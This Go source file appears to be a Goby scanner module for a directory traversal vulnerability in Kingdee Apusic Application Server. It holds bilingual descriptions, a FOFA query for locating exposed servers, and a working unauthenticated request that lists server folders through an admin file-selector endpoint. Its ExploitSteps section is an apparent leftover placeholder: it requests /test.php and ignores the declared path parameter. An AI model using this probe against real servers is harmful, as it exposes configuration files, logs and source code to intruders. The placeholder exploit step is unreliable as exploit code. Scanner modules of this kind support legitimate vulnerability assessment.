package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Apusic Application Server Directory Traversal Vulnerability",
    "Description": "<p>Kingdee Apusic Application Server (AAS) is a standard, safe, efficient, integrated enterprise-level application server software with rich functions, fully supports JakartaEE8/9 technical specifications, and provides Web containers, EJB Containers and WebService containers support the latest technical specifications such as Websocket1.1, Servlet4.0, and HTTP2.0, providing key support for convenient development, flexible deployment, reliable operation, efficient management and control, and rapid integration of enterprise-level applications.</p><p>There is a directory traversal vulnerability in the Apusic application server. An attacker may access some hidden files including configuration files, logs, source code, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain Higher authority.</p>",
    "Product": "APUSIC-App-Server",
    "Homepage": "https://www.apusic.com/",
    "DisclosureDate": "2022-07-01",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "title=\"Apusic应用服务器\"",
    "GobyQuery": "title=\"Apusic应用服务器\"",
    "Level": "2",
    "Impact": "<p>There is a directory traversal vulnerability in the Apusic application server. An attacker may access some hidden files including configuration files, logs, source code, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain Higher authority.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.apusic.com/\">https://www.apusic.com/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "C:/",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/protected/selector/server_file/files?folder=C:/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "total",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "rows",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "Apusic 应用服务器目录遍历漏洞",
            "Product": "Apusic应用服务器",
            "Description": "<p>金蝶Apusic应用服务器（Apusic Application Server，AAS）是一款标准、安全、高效、集成并具丰富功能的企业级应用服务器软件，全面支持JakartaEE8/9的技术规范，提供满足该规范的Web容器、EJB容器以及WebService容器等，支持Websocket1.1、Servlet4.0、HTTP2.0等最新的技术规范，为企业级应用的便捷开发、灵活部署、可靠运行、高效管控以及快速集成等提供关键支撑。</p><p>Apusic 应用服务器存在目录遍历漏洞，攻击者可能通过浏览⽬录结构，访问到某些隐秘⽂件包括配置⽂件、⽇志、源代码等，配合其它漏洞的综合利⽤，攻击者可以轻易的获取更⾼的权限。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.apusic.com/\">https://www.apusic.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Apusic 应用服务器存在目录遍历漏洞，攻击者可能通过浏览⽬录结构，访问到某些隐秘⽂件包括配置⽂件、⽇志、源代码等，配合其它漏洞的综合利⽤，攻击者可以轻易的获取更⾼的权限。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Apusic Application Server Directory Traversal Vulnerability",
            "Product": "APUSIC-App-Server",
            "Description": "<p>Kingdee Apusic Application Server (AAS) is a standard, safe, efficient, integrated enterprise-level application server software with rich functions, fully supports JakartaEE8/9 technical specifications, and provides Web containers, EJB Containers and WebService containers support the latest technical specifications such as Websocket1.1, Servlet4.0, and HTTP2.0, providing key support for convenient development, flexible deployment, reliable operation, efficient management and control, and rapid integration of enterprise-level applications.</p><p>There is a directory traversal vulnerability in the Apusic application server. An attacker may access some hidden files including configuration files, logs, source code, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain Higher authority.</p>",
            "Recommendation": "<p>The official has not fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.apusic.com/\">https://www.apusic.com/</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There is a directory traversal vulnerability in the Apusic application server. An attacker may access some hidden files including configuration files, logs, source code, etc. by browsing the directory structure. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain Higher authority.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
